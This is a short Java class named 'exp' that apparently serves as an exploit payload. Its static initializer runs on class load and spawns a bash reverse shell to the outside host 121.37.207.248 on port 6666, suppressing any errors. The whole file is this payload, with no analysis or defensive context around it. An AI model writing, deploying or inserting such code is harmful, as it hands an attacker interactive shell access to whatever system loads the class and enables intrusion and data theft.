import java.lang.Runtime;
import java.lang.Process;
public class exp {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/121.37.207.248/6666 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
